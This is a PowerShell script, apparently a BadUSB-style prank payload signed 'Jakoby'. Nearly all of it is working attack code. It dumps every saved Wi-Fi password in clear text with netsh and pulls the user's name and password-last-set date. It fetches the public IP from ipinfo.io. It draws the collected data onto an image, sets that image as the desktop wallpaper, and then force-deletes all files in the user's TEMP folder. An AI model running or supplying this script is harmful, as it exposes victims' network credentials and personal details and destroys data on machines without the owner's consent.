$hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"
$ImageName = "dont-be-suspicious"

function Get-Name {
    try {
        $fullName = Net User $Env:USERNAME | Select-String "Full Name"
        return ("$fullName").TrimStart("Full Name")
    } catch {
        return $Env:USERNAME
    }
}

$fn = Get-Name
"Hey $fn" | Out-File "$Env:TEMP\foo.txt"
"`nYour computer is not very secure" | Out-File "$Env:TEMP\foo.txt" -Append

function Get-PubIP {
    try {
        return (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    } catch {
        return $null
    }
}

$PubIP = Get-PubIP
if ($PubIP) {
    "`nYour Public IP: $PubIP" | Out-File "$Env:TEMP\foo.txt" -Append
}

function Get-Days_Set {
    try {
        $pls = net user $env:USERNAME | Select-String "Password last"
        $pls = [string]$pls
        $plsPOS = $pls.IndexOf("e")
        $pls = $pls.Substring($plsPOS + 2).Trim()
        $pls = $pls -replace ".{3}$"
        return $pls
    } catch {
        return $null
    }
}

$pls = Get-Days_Set
if ($pls) {
    "`nPassword Last Set: $pls" | Out-File "$Env:TEMP\foo.txt" -Append
}

$WLANProfileNames = @()
$Output = netsh wlan show profiles | Select-String " : "
foreach ($line in $Output) {
    $WLANProfileNames += (($line -split ":")[1]).Trim()
}

$WLANProfileObjects = @()
foreach ($name in $WLANProfileNames) {
    try {
        $pwd = (((netsh wlan show profile name="$name" key=clear |
            Select-String "Key Content") -split ":")[1]).Trim()
    } catch {
        $pwd = "The password is not stored in this profile"
    }

    $WLANProfileObjects += [PSCustomObject]@{
        ProfileName     = $name
        ProfilePassword = $pwd
    }
}

if ($WLANProfileObjects) {
    "`nW-Lan profiles:`n$($WLANProfileObjects | Out-String)" |
        Out-File "$Env:TEMP\foo.txt" -Append
}

$content = Get-Content "$Env:TEMP\foo.txt" -Raw

Add-Type -AssemblyName System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
}
"@

$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
$w = [PInvoke]::GetDeviceCaps($hdc, 118)
$h = [PInvoke]::GetDeviceCaps($hdc, 117)

$bmp = New-Object System.Drawing.Bitmap $w, $h
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.Clear([System.Drawing.Color]::White)
$graphics.DrawString($content,
    (New-Object System.Drawing.Font Consolas,18),
    [System.Drawing.Brushes]::Black, 50, 50)
$graphics.Dispose()
$bmp.Save("$Env:TEMP\foo.jpg")

$hiddenMessage | Out-File "$Env:TEMP\foo.txt"
cmd /c copy /b "$Env:TEMP\foo.jpg"+"$Env:TEMP\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg" > $null

Remove-Item "$Env:TEMP\foo.txt","$Env:TEMP\foo.jpg" -Force -ErrorAction SilentlyContinue

function Set-WallPaper {
    param([string]$Image)

    Add-Type @"
using System.Runtime.InteropServices;
public class Params {
    [DllImport("User32.dll",CharSet=CharSet.Unicode)]
    public static extern int SystemParametersInfo(int a, int b, string c, int d);
}
"@

    [Params]::SystemParametersInfo(0x14, 0, $Image, 3)
}

Set-WallPaper "$Env:USERPROFILE\Desktop\$ImageName.jpg"

Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
